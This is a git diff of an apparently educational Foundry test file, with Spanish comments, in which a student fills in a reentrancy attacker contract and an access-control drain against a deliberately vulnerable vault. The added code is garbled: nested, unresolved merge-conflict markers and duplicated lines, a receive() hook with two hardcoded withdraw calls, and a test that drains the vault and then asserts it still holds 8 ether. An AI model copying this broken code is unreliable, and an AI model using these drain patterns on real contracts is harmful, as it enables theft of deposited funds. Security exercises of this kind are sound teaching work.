@@ -30,12 +30,22 @@ contract ReentrancyAttacker {
     // Ojo: para poder parar a tiempo en receive(), tal vez te sirva 
     // guardarte cuánto le estás sacando al vault en cada reentrada.
     function attack() external payable {
+        vault.deposit{value: msg.value}();
+        vault.withdraw();
+        vault.deposit{value: msg.value}();
+        vault.withdraw();
     }
 
     // TODO: se ejecuta cada vez que el vault le envia ETH.
     // Ojo con cuando parar: si la ultima llamada al vault revierte, el revert se
     // propaga hacia arriba y deshace todo el ataque.
     receive() external payable {
+        if(address(vault).balance >= 1 ether){
+            vault.withdraw();
+        }
+        if(address(vault).balance >= 1 ether){
+            vault.withdraw();
+        }
     }
 }
 
@@ -64,14 +74,32 @@ contract VaultVulnerableReentrancyTest is Test {
     // cuanto tiene el atacante, y que el libro contable (`balanceOf`) sigue
     // diciendo que las victimas tienen su saldo.
     function test_Reentrancy_DrenaElVault() public {
+<<<<<<< Updated upstream
+<<<<<<< Updated upstream
         // Setup: dos víctimas depositaron 5 ETH cada una. El vault tiene 10.
+=======
+>>>>>>> Stashed changes
+=======
+>>>>>>> Stashed changes
         assertEq(address(vault).balance, 10 ether);
         ReentrancyAttacker attacker = new ReentrancyAttacker(vault);
         vm.deal(attackerOwner, 1 ether);
         vm.prank(attackerOwner);
+<<<<<<< Updated upstream
+<<<<<<< Updated upstream
         attacker.attack{value: 1 ether}(); // invierte 1 ETH
         assertEq(address(vault).balance, 0); // vault vacío
         assertEq(address(attacker).balance, 11 ether); // 1 propio + 10 robados
+=======
+        attacker.attack{value: 1 ether}();
+        assertEq(address(vault).balance, 0);
+        assertEq(address(attacker).balance, 11 ether);
+>>>>>>> Stashed changes
+=======
+        attacker.attack{value: 1 ether}();
+        assertEq(address(vault).balance, 0);
+        assertEq(address(attacker).balance, 11 ether);
+>>>>>>> Stashed changes
     }
 }
 
@@ -96,7 +124,22 @@ contract VaultVulnerableAccessControlTest is Test {
     // los 8 ETH de la victima. Sin contrato atacante: alcanza con llamadas
     // desde su cuenta (`vm.prank`).
     function test_AccessControl_ExtranioSeQuedaConLosFondos() public {
-        vm.skip(true);   // borrar cuando lo escribas
+        assertEq(address(vault).balance, 8 ether);
+        vm.prank(atacante);
+        vault.setAdmin(atacante);
+        vm.prank(atacante);
+        vault.sweep();
+        assertEq(address(vault).balance, 0);
+        assertEq(atacante.balance, 8 ether);
+
+        assertEq(address(vault).balance, 8 ether);
+        vm.prank(atacante);
+        vault.setAdmin(atacante);
+        vm.prank(atacante);
+        vault.sweep();
+        assertEq(address(vault).balance, 0);
+        assertEq(atacante.balance, 8 ether);
+
     }
 }
 
